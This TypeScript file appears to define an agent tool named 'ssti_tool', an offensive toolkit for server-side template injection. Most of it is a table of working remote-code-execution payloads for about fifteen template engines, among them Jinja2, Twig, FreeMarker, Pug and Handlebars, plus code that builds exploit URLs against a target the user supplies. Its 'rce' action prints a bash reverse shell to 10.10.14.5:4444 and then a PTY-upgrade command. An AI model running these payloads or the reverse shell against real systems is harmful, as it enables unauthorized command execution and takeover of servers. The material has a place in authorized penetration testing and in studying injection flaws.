import { Tool } from "./tool"
import z from "zod"

const DESCRIPTION =
  "SSTI Exploitation Toolkit: auto-detect template engines, inject payloads, and get RCE. Supports Jinja2, Twig, Freemarker, Velocity, Smarty, Tornado, ERB, Slim, Pug, Mako, Nunjucks, Handlebars, and more."

const PARAMETERS = z.object({
  action: z
    .enum(["detect", "exploit", "payloads", "rce"])
    .describe("Action: detect engine, exploit, list payloads, get RCE shell"),
  url: z.string().optional().describe("Target URL with FUZZ marker or vulnerable parameter"),
  template: z
    .enum([
      "auto",
      "jinja2",
      "twig",
      "freemarker",
      "velocity",
      "smarty",
      "tornado",
      "erb",
      "slim",
      "pug",
      "mako",
      "nunjucks",
      "handlebars",
      "ejs",
      "razor",
      "thymeleaf",
    ])
    .optional()
    .describe("Template engine (auto for detection)"),
  command: z.string().optional().describe("Command to execute (for exploit/rce actions)"),
  method: z.enum(["GET", "POST"]).optional().describe("HTTP method (default GET)"),
  param: z.string().optional().describe("Vulnerable parameter name"),
  value: z.string().optional().describe("Parameter value to inject SSTI into"),
})

interface EngineDef {
  name: string
  probes: string[]
  rce: string[]
  desc: string
}

const ENGINES: Record<string, EngineDef> = {
  jinja2: {
    name: "Jinja2 (Python/Flask)",
    probes: ["{{7*7}}", "{{config}}", "{{self}}", "{{''.__class__.__mro__}}"],
    rce: [
      "{{config.__class__.__init__.__globals__['os'].popen('CMD').read()}}",
      "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
      "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('CMD').read()}}",
      "{{request.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    ],
    desc: "Flask/Jinja2 - most common in Python web apps",
  },
  twig: {
    name: "Twig (PHP/Symfony)",
    probes: ["{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}", "{{dump(app)}}"],
    rce: [
      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('CMD')}}",
      "{{['CMD']|map('passthru')}}",
      "{{['CMD']|filter('system')}}",
    ],
    desc: "Symfony/Twig - PHP template engine",
  },
  freemarker: {
    name: "FreeMarker (Java)",
    probes: ["${7*7}", "${.now}", "${.version}", "#{7*7}"],
    rce: [
      '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("CMD")}',
      '${"freemarker.template.utility.Execute"?new()("CMD")}',
    ],
    desc: "Java-based template engine (Apache)",
  },
  velocity: {
    name: "Velocity (Java)",
    probes: ["#set($x=7*7)$x", "${7*7}", "$velocityCount"],
    rce: ['#set($e="e");$e.getClass().forName("java.lang.Runtime").getRuntime().exec("CMD")'],
    desc: "Apache Velocity - Java template engine",
  },
  smarty: {
    name: "Smarty (PHP)",
    probes: ["{php}echo 7*7;{/php}", "{$smarty.version}", "{7*7}"],
    rce: ["{php}system('CMD');{/php}"],
    desc: "Smarty - legacy PHP template engine",
  },
  tornado: {
    name: "Tornado (Python)",
    probes: ["{{7*7}}", "{{modules}}", "{{handler.settings}}"],
    rce: ["{{handler.settings}}", "{% import os %}{{os.popen('CMD').read()}}"],
    desc: "Tornado - Python web framework template",
  },
  erb: {
    name: "ERB (Ruby/Rails)",
    probes: ["<%= 7*7 %>", "<%= 7*7", "<% 7*7 %>"],
    rce: ["<%= system('CMD') %>", "<%= IO.popen('CMD').read %>", "<%= `CMD` %>"],
    desc: "Ruby on Rails embedded Ruby templates",
  },
  slim: {
    name: "Slim (Ruby)",
    probes: ["= 7*7", "== 7*7"],
    rce: ["= `CMD`", "= system('CMD')", "= IO.popen('CMD').read"],
    desc: "Slim - Ruby template engine",
  },
  pug: {
    name: "Pug/Jade (Node.js)",
    probes: ["#{7*7}", "= 7*7"],
    rce: [
      "- global.process.mainModule.require('child_process').exec('CMD', (e, o) => {})",
      "= global.process.mainModule.require('child_process').execSync('CMD').toString()",
    ],
    desc: "Pug (formerly Jade) - Node.js template",
  },
  mako: {
    name: "Mako (Python)",
    probes: ["${7*7}", "<% 7*7 %>", "${self.module}"],
    rce: ['${self.module.cache.util.os.system("CMD")}', '<% import os;os.system("CMD") %>'],
    desc: "Mako - Python template engine (Pylons)",
  },
  nunjucks: {
    name: "Nunjucks (Node.js)",
    probes: ["{{7*7}}", "{{range.constructor}}", "{{globals}}"],
    rce: [
      "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('CMD')\")()}}",
      "{{globals.process.mainModule.require('child_process').execSync('CMD').toString()}}",
    ],
    desc: "Nunjucks - Node.js template engine (Mozilla)",
  },
  handlebars: {
    name: "Handlebars (Node.js)",
    probes: ["{{7*7}}", "{{this.constructor.name}}"],
    rce: [
      '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'CMD\')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}',
    ],
    desc: "Handlebars - Node.js logic-less template",
  },
  ejs: {
    name: "EJS (Node.js)",
    probes: ["<%= 7*7 %>", "<% 7*7 %>"],
    rce: [
      "<%- global.process.mainModule.require('child_process').execSync('CMD').toString() %>",
      "<% require('child_process').execSync('CMD') %>",
    ],
    desc: "EJS - Embedded JavaScript templates for Node.js",
  },
  razor: {
    name: "Razor (C#/.NET)",
    probes: ["@(7*7)", "@DateTime.Now", "@Request"],
    rce: ['@{System.Diagnostics.Process.Start("cmd.exe", "/c CMD");}'],
    desc: "Razor - ASP.NET Core template engine",
  },
  thymeleaf: {
    name: "Thymeleaf (Java/Spring)",
    probes: ["${7*7}", "*{7*7}", "@{/}"],
    rce: ["__${T(java.lang.Runtime).getRuntime().exec('CMD')}__"],
    desc: "Thymeleaf - Spring Boot template engine",
  },
}

export const SSTITool = Tool.define("ssti_tool", async () => ({
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params, ctx): Promise<{ title: string; output: string; metadata: Record<string, any> }> {
    const action = params.action
    const template = params.template || "auto"
    const command = params.command || "id"
    const url = params.url
    const method = params.method || "GET"
    const param = params.param || "q"

    if (action === "detect") {
      if (!url) throw new Error("url required for detect action")
      const baseUrl = url.replace("FUZZ", "").replace(/\/$/, "")
      let output = "## SSTI Engine Detection\n\n"
      output += "**Target**: " + baseUrl + "\n"
      output += "**Parameter**: " + param + "\n"
      output += "**Method**: " + method + "\n\n"
      output += "### Probes to try (inject into " + param + "):\n\n"
      output += "| Payload | Engine if returns 49 |\n"
      output += "|---------|---------------------|\n"
      output += "| `{{7*7}}` | Jinja2, Twig, Nunjucks, Handlebars |\n"
      output += "| `${7*7}` | FreeMarker, Velocity, Mako, Thymeleaf |\n"
      output += "| `<%= 7*7 %>` | ERB, EJS |\n"
      output += "| `= 7*7` | Slim |\n"
      output += "| `@(7*7)` | Razor |\n"
      output += "| `{7*7}` | Smarty |\n"
      output += "| `{% module %}` | Tornado |\n\n"
      output += "### Automated detection approach:\n\n"
      output += "1. Send each probe as the " + param + " value\n"
      output += "2. Check if response contains `49` (result of 7*7)\n"
      output += "3. Match the probe to the engine\n"
      output += "4. Use `ssti_tool exploit` with detected engine\n\n"
      output += "### Example:\n```\n"
      output += "GET " + baseUrl + "?" + param + "={{7*7}}\n"
      output += '-> Response contains "49" -> Jinja2/Twig\n'
      output += "```\n"

      return {
        title: "SSTI Detection: " + baseUrl,
        output,
        metadata: { action: "detect", url, param, method } as Record<string, any>,
      }
    }

    if (action === "payloads") {
      let output = "## SSTI Payloads by Engine\n\n"

      for (const [key, eng] of Object.entries(ENGINES)) {
        const show = template === "auto" || template === key
        if (!show) continue
        output += "### " + eng.name + "\n\n" + eng.desc + "\n\n"
        output += "#### Probes\n\n"
        for (const p of eng.probes) {
          output += "```\n" + p + "\n```\n\n"
        }
        output += "#### RCE Payloads\n\n"
        for (const p of eng.rce) {
          const cmdVersion = p.replace(/CMD/g, command)
          output += "```\n" + cmdVersion + "\n```\n\n"
        }
        output += "---\n\n"
      }

      if (template === "auto") {
        output += "### All Engines\n\nSet `template` parameter to a specific engine for focused results.\n"
      }

      return {
        title: "SSTI Payloads: " + template,
        output,
        metadata: { action: "payloads", template } as Record<string, any>,
      }
    }

    if (action === "exploit" || action === "rce") {
      if (!url) throw new Error("url required for exploit action")

      const baseUrl = url.replace("FUZZ", "")
      const eng = template === "auto" ? null : ENGINES[template]

      let output = "## SSTI Exploitation\n\n"

      if (eng) {
        output += "### Target: " + eng.name + "\n\n"
        output += "**URL**: " + baseUrl + "\n"
        output += "**Command**: `" + command + "`\n\n"

        output += "### Payloads (replace CMD with `" + command + "`)\n\n"
        for (const p of eng.rce) {
          const cmdVersion = p.replace(/CMD/g, command)
          const finalURL = baseUrl.includes("=")
            ? baseUrl + encodeURIComponent(cmdVersion)
            : baseUrl + "?" + param + "=" + encodeURIComponent(cmdVersion)
          output += "```\n" + method + " " + finalURL + "\n```\n\n"
        }

        if (action === "rce") {
          output += "### Full RCE Shell\n\n"
          output +=
            "#### Step 1: Verify RCE\n```\n" +
            method +
            " " +
            baseUrl +
            encodeURIComponent(eng.rce[0].replace(/CMD/g, "id")) +
            "\n```\n\n"
          output += "#### Step 2: Reverse shell\n```\n"
          output += eng.rce[0].replace(/CMD/g, "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1")
          output += "\n```\n\n"
          output += "#### Step 3: Upgrade to PTY\n```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n"
        }
      } else {
        output += "### Auto-Exploit Mode\n\n"
        output += "Testing all engines against `" + baseUrl + "` with command `" + command + "`:\n\n"

        for (const [key, engDef] of Object.entries(ENGINES)) {
          output += "#### " + engDef.name + "\n\n"
          const firstRce = engDef.rce[0].replace(/CMD/g, command)
          const finalURL = baseUrl.includes("=")
            ? baseUrl + encodeURIComponent(firstRce)
            : baseUrl + "?" + param + "=" + encodeURIComponent(firstRce)
          output += "```\n" + method + " " + finalURL + "\n```\n\n"
        }
      }

      return {
        title: "SSTI Exploit: " + template,
        output,
        metadata: { action, url, template, command, method } as Record<string, any>,
      }
    }

    throw new Error("unknown action")
  },
}))
